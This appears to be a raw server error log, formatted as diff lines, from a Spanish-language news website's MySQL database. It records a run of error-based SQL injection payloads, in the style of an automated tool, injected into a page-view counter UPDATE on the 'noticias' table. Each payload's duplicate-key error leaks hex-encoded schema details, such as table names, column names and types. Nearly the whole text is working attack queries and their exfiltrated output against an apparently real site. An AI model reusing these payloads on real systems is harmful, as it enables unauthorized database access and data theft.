+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696D6167656E32qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7034 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 8,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6D656469756D74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4693 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 7,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6461746574696D65qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5408 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 1,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722832353029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6267 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 6,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7661726368617228343529qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4147 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 2,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696E7428313129qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5182 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 0,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7661726368617228343529qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 2658 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 3,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq756269636163696F6Eqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8492 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 4,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7061727261666F32qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 3057 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 9,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq746974756C6Fqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 1193 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 5,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7061727261666Fqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4471 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 7,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696D6167656Eqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5128 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 6,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq64617465qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7646 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 1,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq636C6173696669636163696F6Eqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 1800 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 2,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq636975646164qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 9720 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 3,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6964qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8681 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 0,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq3139qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 9026 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT HEX(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6E6F746963696173qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6621 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(table_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64656c6264) LIMIT 0,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6F70696E696F6Eqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4925 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(table_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64656c6264) LIMIT 1,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq32qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 1346 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT HEX(IFNULL(CAST(COUNT(table_name) AS CHAR),0x20)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64656c6264)),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
